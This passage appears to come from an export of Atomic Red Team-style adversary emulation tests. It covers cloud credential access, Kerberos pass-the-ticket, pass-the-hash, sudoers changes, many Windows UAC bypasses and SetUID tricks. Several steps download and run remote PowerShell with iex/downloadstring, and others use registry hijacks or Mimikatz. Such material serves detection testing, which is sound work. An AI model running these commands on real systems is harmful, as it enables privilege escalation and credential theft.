test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | stratus_path | Path of stratus binary | Path | $PathToAtomicsFolder/T1552/src | \n | aws_region | AWS region to detonate | String | us-west-2 | "}, "executionSteps": [{"description": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n", "successCriteria": null}], "techniqueIds": ["clacwm61c030429mq1w0s8399"], "tags": []}, {"data": {"name": "Rubeus Kerberos Pass The Ticket", "shortName": "T1550.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target | Remote system to request the TGT from | string | localhost | \n | user_name | username associated with the ticket (privileged account not required) | String | Administrator | \n | password | password for user_name | String | Password | \n | domain | domain | String | $Env:USERDOMAIN | \n | rubeus_path | Path of the Rubeus binary | Path | $Env:TEMP\\rubeus.exe | \n | rubeus_url | URL of Rubeus executable | Url | https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe | \n | psexec_path | Path of the PsExec binary | String | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path} asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n", "successCriteria": null}], "techniqueIds": ["clacwm6az039x29mqf6r3e2go"], "tags": []}, {"data": {"name": "Mimikatz Kerberos Ticket Attack", "shortName": "T1550.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Similar to PTH, but attacking Kerberos\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ticket | Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module) | String | null | \n | mimikatz_exe | Path of the Mimikatz binary | Path | PathToAtomicsFolder\\T1550.003\\bin\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_exe} \"kerberos::ptt #{ticket}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6az039x29mqf6r3e2go", "clacwm27q00n029mqhsv8dmot"], "tags": []}, {"data": {"name": "Mimikatz Pass the Hash", "shortName": "T1550.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username | String | Administrator | \n | ntlm | ntlm hash | String | cc36cf7a8514893efccd3324464tkg1a | \n | domain | domain | String | %userdnsdomain% | \n | mimikatz_path | mimikatz windows executable | Path | %tmp%\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6r703s829mqhmo638et", "clacwm27n00mx29mqasv7fyqc"], "tags": []}, {"data": {"name": "Invoke-WMIExec Pass the Hash", "shortName": "T1550.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ntlm | ntlm hash | string | cc36cf7a8514893efccd3324464tkg1a | \n | user_name | username | string | Administrator | \n | command | Command to run on target system | string | hostname | \n | target | System to run command on | string | $env:COMPUTERNAME | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "successCriteria": null}], "techniqueIds": ["clacwm6r703s829mqhmo638et"], "tags": []}, {"data": {"name": "crackmapexec Pass the Hash", "shortName": "T1550.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "command execute with crackmapexec\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username | String | Administrator | \n | crackmapexec_exe | crackmapexec windows executable | Path | C:\\CrackMapExecWin\\crackmapexec.exe | \n | command | command to execute | String | whoami | \n | ntlm | command | String | cc36cf7a8514893efccd3324464tkg1a | \n | domain | domain | String | %userdnsdomain% | "}, "executionSteps": [{"description": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n", "successCriteria": null}], "techniqueIds": ["clacwm6r703s829mqhmo638et", "clacwm27n00mx29mqasv7fyqc"], "tags": []}, {"data": {"name": "Unlimited sudo cache timeout", "shortName": "T1548.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "successCriteria": null}], "techniqueIds": ["clacwm5s202qw29mq7x532rl6", "clacwm2hi00vr29mq45dxdsyd"], "tags": []}, {"data": {"name": "Sudo usage", "shortName": "T1548.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Common Sudo enumeration methods.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n", "successCriteria": null}], "techniqueIds": ["clacwm5s202qw29mq7x532rl6", "clacwm2hi00vr29mq45dxdsyd"], "tags": []}, {"data": {"name": "Disable tty_tickets for sudo caching", "shortName": "T1548.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers", "successCriteria": null}], "techniqueIds": ["clacwm5s202qw29mq7x532rl6", "clacwm2hi00vr29mq45dxdsyd"], "tags": []}, {"data": {"name": "WinPwn - UAC Magic", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "UAC bypass using Magic technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "WinPwn - UAC Bypass DiskCleanup technique", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "UAC bypass using DiskCleanup technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "WinPwn - UAC Bypass DccwBypassUAC technique", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "WinPwn - UAC Bypass ccmstp technique", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "UAC bypass using ccmstp technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 61", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\61 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 59", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\59 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 56", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\56 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 39", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\39 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 34", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\34 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 33", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\33 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 31", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\31 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "UACME Bypass Method 23", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | uacme_exe | Path to uacme executable | Path | %temp%\\uacme\\23 Akagi64.exe | "}, "executionSteps": [{"description": "\"#{uacme_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "Disable UAC using reg.exe", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using SilentCleanup task", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | Path to the bat file | String | PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat | "}, "executionSteps": [{"description": "#{file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3"], "tags": []}, {"data": {"name": "Bypass UAC using sdclt DelegateExecute", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command.to.execute | Command to execute | String | cmd.exe /c notepad.exe | "}, "executionSteps": [{"description": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command.to.execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using Fodhelper - PowerShell", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using Fodhelper", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using Event Viewer (PowerShell)", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using Event Viewer (cmd)", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC using ComputerDefaults (PowerShell)", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Bypass UAC by Mocking Trusted Directories", "shortName": "T1548.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_binary | Binary to execute with UAC Bypass | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rx02qp29mq8dg14zo3", "clacwm1fl004529mq3vtic6gz"], "tags": []}, {"data": {"name": "Set a SetUID flag on file", "shortName": "T1548.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test sets the SetUID flag on a file in Linux and macOS.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_setuid | Path of file to set SetUID flag | Path | /tmp/evilBinary | "}, "executionSteps": [{"description": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+s #{file_to_setuid}\n", "successCriteria": null}], "techniqueIds": ["clacwm67r036i29mqhgmzc8yn", "clacwm2f800tt29mqhbgicjua"], "tags": []}, {"data": {"name": "Set a SetGID flag on file", "shortName": "T1548.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test sets the SetGID flag on a file in Linux and macOS.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_setuid | Path of file to set SetGID flag | Path | /tmp/evilBinary | "}, "executionSteps": [{"description": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+s #{file_to_setuid}\n", "successCriteria": null}], "techniqueIds": ["clacwm67r036i29mqhgmzc8yn", "clacwm2f800tt29mqhbgicjua"], "tags": []}, {"data": {"name": "Provide the SetUID capability to a file", "shortName": "T1548.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test gives a file the capability to set UID without using flags.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_setcap | Path of file to provide the SetUID capability | Path | /tmp/evilBinary | "}, "executionSteps": [{"description": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n", "successCriteria": null}], "techniqueIds": ["clacwm67r036i29mqhgmzc8yn"], "tags": []}, {"data": {"name": "Make and modify capabilities of a binary", "shortName": "T1548.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n\n\n**Supported 